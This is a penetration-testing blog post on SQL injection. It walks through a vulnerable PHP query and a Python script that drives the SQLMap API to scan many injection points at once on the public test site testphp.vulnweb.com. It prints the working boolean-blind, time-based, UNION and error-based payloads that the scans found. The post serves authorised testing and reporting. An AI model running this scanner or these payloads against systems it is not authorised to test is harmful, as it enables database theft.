---
title: Testing for multiple SQL-injectable points
author: 0xbhsu
description: How to easily make a PoC for multiple SQL-injectable points?
date: '2024-03-28'
toc: true
---



## The reason
The purpose of this post is to present a solution to a problem you may eventually face during a pentest or related activity. The scenario is somewhat unusual, but it happened to me recently. The issue lies in having multiple points potentially vulnerable to SQL injection. Assuming you already suspect that most (if not all) of the points are vulnerable, you are faced with the following question: how to easily catalog all vulnerable and non-vulnerable points in order to generate a valid *PoC* to include in the report or present to the client?

We won't always encounter a scenario with multiple instances of SQL injection, but it can happen in environments with lower maturity. Therefore, this post aims to reveal an easy and automated way to **test and create PoCs for multiple points vulnerable to SQL injection**, using the [SQLMap API](https://github.com/sqlmapproject/sqlmap/blob/master/sqlmapapi.py).



## What is SQL-Injection and SQLMap
It's important that we do a brief review of the vulnerability and the tool used to exploit it.

**SQL-Injection** (SQLi) is a type of web vulnerability that allows an attacker to interfere with the queries the application makes to the database. This attack has numerous purposes, from obtaining/editing data that the attacker wouldn't normally have access to, to executing code on the target system in some specific scenarios. This flaw occurs when the application takes user input and passes it to the SQL query without any form of sanitization or parameterization, thereby handing control over to the attacker. For example, consider the following PHP code:

```php
$mysqli = new mysqli('localhost', 'myuser', 'mypassword', 'mydatabase');
$query = "SELECT name, email, password FROM users WHERE username='{$_REQUEST['username']}'";
$result = $mysqli->execute_query($query);
```

Note that the application is receiving the parameter **username** and directly concatenating it into the query, without any form of parameterization/sanitization. Consider that an attacker passes the following SQL query snippet to the **username** parameter:

```
anyuser' or 'a'='a
```

The addition of this code snippet will result in something like:

```sql
SELECT name, email, password FROM users WHERE username='anyuser' or 'a'='a'
```

The addition of the condition **'a'='a'** causes the WHERE clause to always return true, meaning the query becomes logically equivalent to:

```sql
SELECT name, email, password FROM users;
```

In this case, the application would retrieve information from the database for all users, regardless of the username.

There are various types of SQLi, with different exploitation methods, but this goes beyond the scope of the article since we're not concerned with the specific exploitation of different types of SQLi, but rather with mass exploitation across different points within the application. For this purpose, we can use the tool [SQLMap](https://github.com/sqlmapproject/sqlmap/), which automates the exploitation process for various scenarios, eliminating the need for manual testing (although there may be false positives occasionally). The tool also provides a [REST API](https://github.com/sqlmapproject/sqlmap/blob/master/sqlmapapi.py), allowing us to set up a local instance and use it to perform multiple scans simultaneously.


## Standardizing the targets
Before we can spin up an instance of the API itself and begin performing mass scans, it's necessary to standardize the targets. The idea is to create a *JSON* file containing specific target information to be consumed by the target processor that will perform the scans. The SQLMap API accepts certain options, which correspond to the standard flags for running by CLI (the complete list of options can be obtained [here](https://github.com/sqlmapproject/sqlmap/blob/master/lib/core/optiondict.py)):

```
url
data
cookie
.
.
.
testParameter
tamper
dbms
```

In this manner, we can create a JSON file that consolidates all this information for all the targets we wish to test. This kind of information can be generated through some form of web scraping or with the assistance of a tool like [ParamSpider](https://github.com/devanshbatham/ParamSpider). For testing purposes, let's use some URLs from [VulnWeb](http://testphp.vulnweb.com/):

```json
[
    {
        // GET SQLi - vulnerable
        "url":"http://testphp.vulnweb.com/artists.php?artist=1",
        "data":"",
        "cookie":"",
        "testParameter":"artist",
        "tamper":"",
        "dbms":""
    },
    {
        // POST SQLi - non-vulnerable
        "url":"http://testphp.vulnweb.com/search.php?test=query",
        "data":"searchFor=mysearch&goButton=go",
        "cookie":"",
        "testParameter":"searchFor",
        "tamper":"",
        "dbms":""
    },
    {
        // GET SQLi - vulnerable
        "url":"http://testphp.vulnweb.com/listproducts.php?cat=2",
        "data":"",
        "cookie":"",
        "testParameter":"cat",
        "tamper":"",
        "dbms":""
    },
    {
        // POST SQLi authenticated - vulnerable
        "url":"http://testphp.vulnweb.com/userinfo.php",
        "data":"urname=aaa&ucc=1234-5678-2300-9000&uemail=email%40email.com&uphone=2323345&uaddress=21+street&update=update",
        "cookie":"login=test/test",
        "testParameter":"urname",
        "tamper":"",
        "dbms":""
    },
    {
        // GET SQLi - non-vulnerable
        "url":"http://testphp.vulnweb.com/index.php?id=3",
        "data":"",
        "cookie":"",
        "testParameter":"id",
        "tamper":"",
        "dbms":""
    }
]
```

With our target file defined and standardized, we can pass it to the processor that will start the scans using the API simultaneously:


## The processor
Let's use the following Python script, capable of reading the target file generated in the previous section and initiating the scans.

The script imports the necessary libraries, parses the JSON target file, and declares some variables:

```python
#!/usr/bin/python3
from colorama import Fore, Style
from datetime import datetime
from tqdm import tqdm
import requests
import asyncio
import aiohttp
import json
import sys
import os

SQLMAP_SERVER_IP = "http://127.0.0.1"  # change this
SQLMAP_SERVER_PORT = 1337  # and this
RESULTS_DATA = {"results": []}  # dict to store the results
TASKS = []
RESULTS_FILENAME = f"report-{datetime.now().strftime('%d-%m-%Y_%H-%M')}.json"
try:
    TARGETS_FILE = sys.argv[1]
    if not os.path.isfile(TARGETS_FILE):
        print("Targets file not found!")
        exit(1)
    with open(TARGETS_FILE, "r", encoding="utf-8") as f:
        TARGETS_JSON = json.loads(f.read())
except IndexError:
    print("Usage: ./processor.py targets.json")
    exit(1)
```

After that, it loops through all the targets defined in the JSON file, creating and starting them in the SQLMap API:

```python
# Creating/starting tasks
print(f" [*] {Fore.YELLOW}Creating and starting tasks...{Style.RESET_ALL}")
for target in TARGETS_JSON:
    # using requests lib here instead of aiohttp because there's no need
    task_id = requests.get(f"{SQLMAP_SERVER_IP}:{SQLMAP_SERVER_PORT}/task/new").json()["taskid"]  # generate a new taskID
    TASKS.append({"task_id": task_id, "task_url": target["url"]})  # appending to the task list
    data = {"threads": 10, "risk": 3, "level": 5}
    for arg, value in target.items():  # parsing options from the file to use in the API
        data[arg] = value if len(value) else None
    # starting the task
    r = requests.post(f"{SQLMAP_SERVER_IP}:{SQLMAP_SERVER_PORT}/scan/{task_id}/start", json=data, headers={"Content-Type": "application/json"}).json()
    print(f" [-] {Fore.YELLOW}Task created and started ({Fore.CYAN}{task_id}{Fore.YELLOW}){Style.RESET_ALL}")
```

And then, the function responsible for managing all tasks asynchronously is called, using the **TaskProcessor** class:

```python
async def runner(size_pbar):
    print(f" [*] {Fore.YELLOW}Parsing tasks...{Style.RESET_ALL}")
    with tqdm(total=size_pbar, leave=False) as pbar:
        SCAN_TASKS = [TaskProcessor(task, pbar) for task in TASKS]  # creating API fetching for every task
        await asyncio.gather(*[scan_task.process_task() for scan_task in SCAN_TASKS])  # processing every task
        await asyncio.gather(*[scan_task.close_session() for scan_task in SCAN_TASKS])  # closing async HTTP session

# Starting the async API fetching
asyncio.run(runner(len(TASKS)))
```

The **TaskProcessor** class is responsible for obtaining information from the API related to the scan of a particular task until the scan is completed:

```python
class TaskProcessor:
    def __init__(self, task, progress_bar):
        self._TASK_ID = task["task_id"]
        self._TASK_URL = task["task_url"]
        self._SLEEP_TIME = 15
        self._PB = progress_bar
        self.__SESSION = aiohttp.ClientSession()
        self.__API_SCAN_URL = f"{SQLMAP_SERVER_IP}:{SQLMAP_SERVER_PORT}/scan/{self._TASK_ID}"

    async def __fetch_status(self):
        async with self.__SESSION.get(f"{self.__API_SCAN_URL}/status") as response:
            return await response.json()

    async def __fetch_data(self):
        async with self.__SESSION.get(f"{self.__API_SCAN_URL}/data") as response:
            return await response.json()

    async def close_session(self):
        await self.__SESSION.close()

    async def process_task(self):
        while True:
            task_status = await self.__fetch_status()
            if task_status["status"] == "terminated":
                task_data = await self.__fetch_data()
                is_vuln = False if not len(task_data["data"]) else True
                result = {"url": self._TASK_URL, "is_vuln": is_vuln, "vectors": []}
                if is_vuln:
                    for data in task_data["data"]:
                        if data["type"] == 1:
                            for attack_vector in data["value"][0]["data"].values():
                                result["vectors"].append({"vector_title": attack_vector["title"], "vector_payload": attack_vector["payload"]})
                            break
                RESULTS_DATA["results"].append(result)
                self._PB.update(1)
                break
            await asyncio.sleep(self._SLEEP_TIME)
```

The class contains the following methods:
- **__fetch_status**
    - returns the status of the current task (running/terminated).
- **__fetch_data**
    - returns the results of the current task.
- **close_session**
    - closes the asynchronous HTTP session.
- **process_task**
    - processes the task itself:
        - Retrieves the task status; if the status is "terminated", checks if the target is vulnerable based on the scan result; if positive, parses all enumerated SQLi vectors, with title and payload; finally, adds the result of the current task to the results dictionary and updates the progress bar.

This way, it saves and prints the JSON results (which will be used later as an attachment, for example):

```python
# Writing results to file
print(f" [+] {Fore.GREEN}Scan completed! Saving data to file {Fore.CYAN}{RESULTS_FILENAME}{Style.RESET_ALL}")
with open(RESULTS_FILENAME, "w", encoding="utf-8") as f:
    json.dump(RESULTS_DATA, f, indent=4)

# Printing the results aswell
for result in RESULTS_DATA["results"]:
    if result['is_vuln']:
        print(f"  > {Fore.RED}{result['url']} (vulnerable){Style.RESET_ALL}")
        for i in result["vectors"]:
            print(f"     * {i['vector_title']}")
    else:
        print(f"  > {Fore.YELLOW}{result['url']} (not vulnerable){Style.RESET_ALL}")
```

The complete script can be obtained [here](/processor).

## Assembling all the pieces together
We can spin up a server instance of the REST API running on a specific port:

```bash
$ python3 sqlmapapi.py -s -p 1337
[03:11:26] [INFO] Running REST-JSON API server at '127.0.0.1:1337'..
[03:11:26] [INFO] Admin (secret) token: a116ad0af917500a2d633f1dc1712819
[03:11:26] [DEBUG] IPC database: '/tmp/sqlmapipc-l2y2xzcd'
[03:11:26] [DEBUG] REST-JSON API server connected to IPC database
[03:11:26] [DEBUG] Using adapter 'wsgiref' to run bottle
```

And run the script passing our JSON target file:

```bash
$ ./processor.py targets.json 
 [*] Creating and starting tasks...
 [-] Task created and started (da7cae098aeba34c)
 [-] Task created and started (7edc50f5fe94c235)
 [-] Task created and started (f1068fdecd9d3b43)
 [-] Task created and started (e09685d928d8ff0a)
 [-] Task created and started (5629e033e525b5d4)
 [*] Parsing tasks...
 40%|█████████████████████████████████████████████████████████▌                                        | 2/5 [00:45<01:03, 21.21s/it]

```

Connecting to the API as a client, we can observe that the tasks have been created and are being processed:

```bash
$ python3 sqlmapapi.py -c -p 1337
api> list
[03:15:20] [DEBUG] Calling 'http://127.0.0.1:1337/admin/list'
{
    "success": true,
    "tasks": {
        "da7cae098aeba34c": "terminated",
        "7edc50f5fe94c235": "running",
        "f1068fdecd9d3b43": "terminated",
        "e09685d928d8ff0a": "running",
        "5629e033e525b5d4": "running"
    },
    "tasks_num": 5
}
```

After all tasks have finished, the script will save the results in a JSON report file and display the results on the screen:

<img src="/testing-multiple-sqli-points-content/scan_result.png" alt="Scan Result">

```json
// report-03-04-2024_03-17.json
{
    "results": [
        {
            "url": "http://testphp.vulnweb.com/artists.php?artist=1",
            "is_vuln": true,
            "vectors": [
                {
                    "vector_title": "AND boolean-based blind - WHERE or HAVING clause",
                    "vector_payload": "artist=1 AND 8351=8351"
                },
                {
                    "vector_title": "MySQL >= 5.0.12 AND time-based blind (query SLEEP)",
                    "vector_payload": "artist=1 AND (SELECT 8077 FROM (SELECT(SLEEP([SLEEPTIME])))ZMeR)"
                },
                {
                    "vector_title": "Generic UNION query (NULL) - 1 to 20 columns",
                    "vector_payload": "artist=-9084 UNION ALL SELECT NULL,NULL,CONCAT(0x717a766a71,0x57674f59474559506c77484d524d7946586a776a4f72764e4764767666695278796d497779794d73,0x7162787a71)-- -"
                }
            ]
        },
        {
            "url": "http://testphp.vulnweb.com/listproducts.php?cat=2",
            "is_vuln": true,
            "vectors": [
                {
                    "vector_title": "AND boolean-based blind - WHERE or HAVING clause",
                    "vector_payload": "cat=2 AND 4166=4166"
                },
                {
                    "vector_title": "MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)",
                    "vector_payload": "cat=2 AND GTID_SUBSET(CONCAT(0x716a7a7071,(SELECT (ELT(6724=6724,1))),0x7171767871),6724)"
                },
                {
                    "vector_title": "MySQL >= 5.0.12 AND time-based blind (query SLEEP)",
                    "vector_payload": "cat=2 AND (SELECT 3876 FROM (SELECT(SLEEP([SLEEPTIME])))Jekt)"
                },
                {
                    "vector_title": "Generic UNION query (NULL) - 1 to 20 columns",
                    "vector_payload": "cat=2 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716a7a7071,0x4b754c4b544a6a6b72737265556744724b54625771446e797a59585241784b6d456274746a554d75,0x7171767871),NULL-- -"
                }
            ]
        },
        {
            "url": "http://testphp.vulnweb.com/index.php?id=3",
            "is_vuln": false,
            "vectors": []
        },
        {
            "url": "http://testphp.vulnweb.com/userinfo.php",
            "is_vuln": true,
            "vectors": [
                {
                    "vector_title": "MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)",
                    "vector_payload": "urname=aaa'||(SELECT 0x7a524543 WHERE 6374=6374 AND GTID_SUBSET(CONCAT(0x71766b6a71,(SELECT (ELT(2043=2043,1))),0x71706b7871),2043))||'&ucc=1234-5678-2300-9000&uemail=email@email.com&uphone=2323345&uaddress=21 street&update=update"
                }
            ]
        },
        {
            "url": "http://testphp.vulnweb.com/search.php?test=query",
            "is_vuln": false,
            "vectors": []
        }
    ]
}
```

## Conclusion
This way, we can use the JSON file generated by the script as an attachment to our pentest report or presentation. You can even modify the script to generate a specifically formatted file that fits your particular case.
